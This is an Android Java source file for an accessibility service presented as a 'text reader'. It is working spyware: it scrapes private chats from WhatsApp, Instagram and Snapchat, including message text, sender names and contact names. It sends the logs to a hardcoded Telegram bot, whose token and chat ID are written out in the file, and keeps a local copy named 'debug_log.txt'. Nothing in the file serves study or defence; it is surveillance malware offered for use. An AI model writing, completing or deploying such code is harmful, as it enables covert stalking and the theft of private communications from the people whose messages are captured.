package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 YOUR TELEGRAM CREDENTIALS
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
    private static final String CHAT_ID = "5465116744";

    // Cooldown & deduplication
    private long lastSendTime = 0;
    private String lastSentHash = "";

    // Known view IDs for message bubbles (containers)
    private Set<String> messageContainerIds = new HashSet<String>() {{
        // WhatsApp
        add("com.whatsapp:id/outgoing_message_container");
        add("com.whatsapp:id/incoming_message_container");
        add("com.whatsapp:id/message_row");
        // Instagram
        add("com.instagram.android:id/row_message_container");
        add("com.instagram.android:id/comment_row");
        // Snapchat
        add("com.snapchat.android:id/chat_bubble");
    }};

    // View IDs that contain the actual text inside a message
    private Set<String> messageTextIds = new HashSet<String>() {{
        add("com.whatsapp:id/message_text");
        add("com.instagram.android:id/row_message_text");
        add("com.instagram.android:id/comment_text");
        add("com.instagram.android:id/direct_message_text");
        add("com.snapchat.android:id/chat_message_text");
    }};

    // View IDs for sender names (for incoming messages)
    private Set<String> senderNameIds = new HashSet<String>() {{
        add("com.whatsapp:id/contact_name");
        add("com.whatsapp:id/sender_name");
        add("com.instagram.android:id/row_user_name");
        add("com.instagram.android:id/comment_user_name");
        add("com.instagram.android:id/username_text_view");
        add("com.snapchat.android:id/chat_name");
    }};

    // Blacklist – same as before
    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
        add("Active now"); add("Typing..."); add("Today"); add("Yesterday");
        add("Seen by"); add("Delivered to"); add("Read by");
        add("Message"); add("Chat"); add("Group"); add("Broadcast");
        add("View Profile"); add("View Story"); add("Reply to");
        add("Manage"); add("Clear all"); add("Location off");
        add("Self Aware"); add("Inspo needed...");
        add("GB"); add("MB"); add("used"); add("airtel"); add("Screenlogger");
        add("Telegram"); add("Search or ask Meta AI");
        add("The Wild Theme"); add("Janam Janam"); add("Sai Abhyankkar");
        add("Dhanush"); add("Pritam"); add("Arijit Singh"); add("Antara Mitra");
        add("Aber sie"); add("Requests"); add("BHAI LOG 💓🫂");
        add("Bakchodi boiz"); add("MARK AS READ");
        add("Display brightness");
    }};

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sendToTelegram("✅ Screen Logger service started successfully!");
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Only process events from target apps
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // Only on window or content change
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        // 1. Get chat contact name (the person you're talking to)
        String chatContact = findChatContact(root, pkg);

        // 2. Extract messages with sender info
        List<MessageEntry> messages = extractMessagesWithSenders(root, pkg);

        if (messages.isEmpty()) return;

        // 3. Build structured output
        StringBuilder logBuilder = new StringBuilder();
        logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
        if (chatContact != null && !chatContact.isEmpty()) {
            logBuilder.append("👤 Chat with: ").append(chatContact).append("\n");
        }
        logBuilder.append("─────────────────────\n");
        for (MessageEntry msg : messages) {
            logBuilder.append("  ").append(msg.sender).append(": ").append(msg.text).append("\n");
        }

        String fullLog = logBuilder.toString().trim();
        if (fullLog.length() < 30) return;

        // 4. Deduplication & cooldown
        String hash = Integer.toHexString(fullLog.hashCode());
        long now = System.currentTimeMillis();
        if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
            return;
        }
        lastSentHash = hash;
        lastSendTime = now;

        // 5. Send
        sendToTelegram(fullLog);
        writeToFile(fullLog);
    }

    // ---- Helper classes and methods ----

    private static class MessageEntry {
        String sender;
        String text;
        MessageEntry(String sender, String text) {
            this.sender = sender;
            this.text = text;
        }
    }

    private String findChatContact(AccessibilityNodeInfo root, String pkg) {
        // Try to find the contact name from the chat header
        String[] headerIds;
        if (pkg.equals("com.whatsapp")) {
            headerIds = new String[]{"com.whatsapp:id/contact_name", "com.whatsapp:id/conversation_contact_name"};
        } else if (pkg.equals("com.instagram.android")) {
            headerIds = new String[]{"com.instagram.android:id/direct_message_recipient_name", "com.instagram.android:id/row_user_name"};
        } else {
            headerIds = new String[]{"com.snapchat.android:id/chat_name"};
        }
        for (String id : headerIds) {
            String name = findTextByViewId(root, id);
            if (name != null && !name.isEmpty()) return name;
        }
        return null;
    }

    private String findTextByViewId(AccessibilityNodeInfo node, String targetId) {
        if (node == null) return null;
        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
            if (node.getText() != null) {
                String text = node.getText().toString().trim();
                if (!text.isEmpty()) return text;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String result = findTextByViewId(child, targetId);
                if (result != null) return result;
            }
        }
        return null;
    }

    private List<MessageEntry> extractMessagesWithSenders(AccessibilityNodeInfo root, String pkg) {
        List<MessageEntry> entries = new ArrayList<>();

        // Find all message containers (bubbles)
        List<AccessibilityNodeInfo> containers = findMessageContainers(root, pkg);

        for (AccessibilityNodeInfo container : containers) {
            // Determine if it's outgoing or incoming by checking the view ID
            String viewId = container.getViewIdResourceName();
            boolean isOutgoing = false;
            if (viewId != null) {
                if (viewId.contains("outgoing") || viewId.contains("self")) {
                    isOutgoing = true;
                } else if (viewId.contains("incoming") || viewId.contains("received")) {
                    isOutgoing = false;
                } else {
                    // Fallback: check if there is a sender name node inside
                    boolean hasSender = false;
                    for (String nameId : senderNameIds) {
                        if (findTextByViewId(container, nameId) != null) {
                            hasSender = true;
                            break;
                        }
                    }
                    isOutgoing = !hasSender; // if no sender name, it's likely outgoing
                }
            }

            // Extract message text from the container
            String msgText = extractMessageTextFromContainer(container);
            if (msgText == null || msgText.isEmpty()) continue;

            // Clean the message
            msgText = cleanMessage(msgText);
            if (msgText.isEmpty()) continue;

            // Determine sender name
            String sender;
            if (isOutgoing) {
                sender = "You";
            } else {
                // Try to get contact name from the container (incoming)
                String senderName = null;
                for (String nameId : senderNameIds) {
                    String found = findTextByViewId(container, nameId);
                    if (found != null && !found.isEmpty()) {
                        senderName = found;
                        break;
                    }
                }
                // If still null, try to get the global chat contact
                if (senderName == null || senderName.isEmpty()) {
                    senderName = findChatContact(root, pkg);
                }
                sender = (senderName != null && !senderName.isEmpty()) ? senderName : "Unknown";
            }

            entries.add(new MessageEntry(sender, msgText));
        }

        return entries;
    }

    private List<AccessibilityNodeInfo> findMessageContainers(AccessibilityNodeInfo root, String pkg) {
        List<AccessibilityNodeInfo> containers = new ArrayList<>();
        traverseContainers(root, containers, pkg);
        return containers;
    }

    private void traverseContainers(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list, String pkg) {
        if (node == null) return;
        // Check if this node is a known message container
        String viewId = node.getViewIdResourceName();
        if (viewId != null) {
            for (String id : messageContainerIds) {
                if (viewId.equals(id) || viewId.contains("message_row") || viewId.contains("bubble")) {
                    list.add(node);
                    return; // don't go deeper into this container to avoid duplicates
                }
            }
        }
        // Also check if it's a direct message text node (if no container found)
        if (viewId != null) {
            for (String id : messageTextIds) {
                if (viewId.equals(id)) {
                    // This is a text node, wrap it as a container (we'll treat it as standalone)
                    list.add(node);
                    return;
                }
            }
        }
        // Recurse children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) traverseContainers(child, list, pkg);
        }
    }

    private String extractMessageTextFromContainer(AccessibilityNodeInfo container) {
        // Try to find a child with a known message text ID
        for (String textId : messageTextIds) {
            String text = findTextByViewId(container, textId);
            if (text != null && !text.isEmpty()) return text;
        }
        // Fallback: collect all text in the container
        StringBuilder sb = new StringBuilder();
        collectAllText(container, sb);
        return sb.toString();
    }

    private void collectAllText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            if (!text.isEmpty()) {
                if (sb.length() > 0) sb.append(" ");
                sb.append(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectAllText(child, sb);
        }
    }

    private String cleanMessage(String msg) {
        msg = msg.trim();
        // Remove junk
        for (String junk : uiJunk) {
            if (msg.toLowerCase().contains(junk.toLowerCase())) return "";
        }
        // Remove timestamps
        if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return "";
        if (msg.matches(".*(AM|PM).*")) return "";
        if (msg.matches(".*\\d+[mh] .*")) return "";
        // Must contain at least one alphabetic character
        if (!msg.matches(".*[a-zA-Z].*")) return "";
        if (msg.length() < 3) return "";
        if (msg.equals(msg.toUpperCase()) && msg.length() < 8) return "";
        return msg;
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    // ---- Telegram & File logging ----

    private void sendToTelegram(final String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(message, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                writeToFile("Telegram error: " + e.toString());
            }
        }).start();
    }

    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) { /* ignore */ }
    }

    @Override
    public void onInterrupt() {}
}
